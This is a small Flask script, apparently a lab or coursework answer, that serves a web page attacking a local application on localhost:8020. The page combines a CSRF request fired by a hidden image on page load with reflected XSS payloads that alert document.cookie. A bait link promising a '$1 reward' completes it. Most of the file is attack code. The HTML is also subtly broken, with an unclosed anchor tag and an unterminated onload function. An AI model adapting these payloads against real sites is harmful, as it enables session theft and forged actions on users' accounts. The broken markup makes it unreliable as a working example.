from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def start():
    # Redirect to the route where the CSRF attack is triggered
    return redirect('/Q3')

@app.route('/Q3')
def index():
    # This page will automatically trigger the CSRF attack
    return '''<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>CSRF Attack</title>
            </head>
            <body>
                <h1>Click <a href="http://localhost:8020/loggedIn?username=&moneyAmount=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
                here</a> to claim your $1 reward! (XSS attack)</h1>
                <!-- Embedding an image that triggers the CSRF attack automatically -->
                <img id="csrfImage" src="http://localhost:8020/loggedIn?username=&moneyAmount=%3Cscript%3Ealert(%27Site%20is%20vulnerable%20to%20XSS!%27)%3C/script%3E"
                
                alt="Click me!" style="display:none;">
                <script>
                    // Function to trigger the CSRF attack when the page loads
                    window.onload = function() {
                        document.getElementById('csrfImage').src ="http://localhost:8020/loggedIn?username=&moneyAmount=%3Cscript%3Ealert(document.cookie)%3C/script%3E";
                </script>
            </body>
            </html>'''

if __name__ == "__main__":
    app.run(debug=True, port=5000)
